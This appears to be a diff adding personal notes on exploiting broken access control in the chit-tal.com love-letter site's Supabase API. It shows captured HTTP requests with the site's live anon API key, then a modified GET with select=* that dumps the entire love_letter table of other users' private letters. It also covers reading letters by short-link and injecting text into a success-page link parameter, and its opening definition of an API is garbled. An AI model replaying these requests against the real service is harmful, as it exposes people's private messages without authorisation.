@@ -1,0 +1,76 @@
+API is an application broken interface.
+
+Google server (weather_check function)----- api_key ------> Website,software.
+
+//Website using weather check function from google server using api_key.
+
+API_broken_access_control is penetrating e.g. google server without needing api_key
+
+Chit-tal Web_server (function) ----- api_key ------> Website
+
+///Original one
+
+POST /rest/v1/love_letter?select=* HTTP/2
+Host: lyllxruorlhhsoxvyovk.supabase.co
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.chit-tal.com/
+Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5bGx4cnVvcmxoaHNveHZ5b3ZrIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTIzNjM5MzcsImV4cCI6MjAwNzkzOTkzN30.bdDc6keuQyUq2ELR2vFUHVGFErJ-s2X-BPm_8bMoEDk
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5bGx4cnVvcmxoaHNveHZ5b3ZrIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTIzNjM5MzcsImV4cCI6MjAwNzkzOTkzN30.bdDc6keuQyUq2ELR2vFUHVGFErJ-s2X-BPm_8bMoEDk
+Content-Profile: public
+Content-Type: application/json
+Prefer: return=representation
+X-Client-Info: supabase-js/2.32.0
+Content-Length: 183
+Origin: https://www.chit-tal.com
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Te: trailers
+
+{"author_name":"Maung","beloved_name":"Kyaw","lover_letter":"U2FsdGVkX19tRZb9PzJsWd2PbdGc7nLEcM7xB5lADZNvb8rJhNpzrgsXJU+XJ/Cl","short_link":"W2MixdrCXNwr4u0brAhMp","theme":1}
+
+
+///Modified one (change request method and delete the lines below)
+
+
+GET /rest/v1/love_letter?select=* HTTP/2
+Host: lyllxruorlhhsoxvyovk.supabase.co
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+Accept: */*
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
+Referer: https://www.chit-tal.com/
+Apikey: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5bGx4cnVvcmxoaHNveHZ5b3ZrIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTIzNjM5MzcsImV4cCI6MjAwNzkzOTkzN30.bdDc6keuQyUq2ELR2vFUHVGFErJ-s2X-BPm_8bMoEDk
+Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Imx5bGx4cnVvcmxoaHNveHZ5b3ZrIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTIzNjM5MzcsImV4cCI6MjAwNzkzOTkzN30.bdDc6keuQyUq2ELR2vFUHVGFErJ-s2X-BPm_8bMoEDk
+Content-Profile: public
+Prefer: return=representation
+X-Client-Info: supabase-js/2.32.0
+Origin: https://www.chit-tal.com
+Sec-Fetch-Dest: empty
+Sec-Fetch-Mode: cors
+Sec-Fetch-Site: cross-site
+Te: trailers
+
+
+1. Finally, Get into the chit_tal webserver. And check the web-server logs
+
+
+2. If we want to see what is written, copy the short-link and paste in the browser.
+
+https://www.chit-tal.com/trPBaA5IhTieL07x0XCjO
+
+trPBaA5IhTieL07x0XCjO(short-link)
+
+3. QR code has vulnerability
+
+Original ----> https://www.chit-tal.com/success?link=https://chit-tal.com/rs-Dql9Mv_cfHZknNUJwq
+
+Modified ----> https://www.chit-tal.com/success?link=What is your name
+
+
+
+
+
